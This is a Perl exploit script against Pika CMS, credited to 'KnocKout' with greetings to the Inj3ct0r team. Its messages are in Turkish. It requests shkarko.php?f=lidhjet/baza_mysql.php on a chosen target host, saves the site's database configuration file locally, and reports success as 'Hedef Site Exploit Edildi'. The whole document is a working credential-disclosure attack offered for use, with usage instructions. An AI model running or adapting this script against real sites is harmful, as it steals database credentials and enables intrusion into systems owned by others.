use LWP::Simple;
use LWP::UserAgent;
system('cls');
system('title Pika CMS <= Remote 'baza_mysql.php' Disclosure  Exploit');
system('color 2');
if(@ARGV < 2)
{
print "[-]Su Sekilde Kocum. \n\n";
&help; exit();
}
sub help()
{
print "[+] usage1 : perl $0 HedefWeb /path/ \n";
print "[+] usage2 : perl $0 localhost / \n";
}
print "\n************************************************************************\n";
print "\* Pika CMS <= Remote 'baza_mysql.php' Disclosure  Exploit              *\n";
print "\* Exploited By : KnocKout                                                  *\n";
print "\* Contact :   knockoutr[at]msn[dot]com                                 *\n";
print "\* --                                    *\n";
print "\*********************************************************************\n\n\n";
($TargetIP, $path, $File,) = @ARGV;
$File="shkarko.php?f=lidhjet/baza_mysql.php";
my $url = "http://" . $TargetIP . $path . $File;
print "\n Az Bekle Sikertiyorum!!! \n\n";
my $useragent = LWP::UserAgent->new();
my $request = $useragent->get($url,":content_file" => "baza_mysql.php");
if ($request->is_success)
{
print "[+] $url <= Hedef Site Exploit Edildi!\n\n";
print "[+] OPERASYON TAMAM !\n";
print "[+] baza_mysql.php Dosyasi Indirildi (z_WALKING_TIMES_DATA.php)\n";
print "[+] GRAYHATZ STAR \n";
print "[+] Special tnX # + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * agix * KedAns-Dz
# gunslinger_ * Sn!pEr.S!Te * ZoRLu * anT!-Tr0J4n 'www.1337day.com/team' ++ .... 
 \n";
exit();
}
else
{
print "[!] Exploit $url Basarisiz !\n[!] ".$request->status_line."\n";
exit();
}

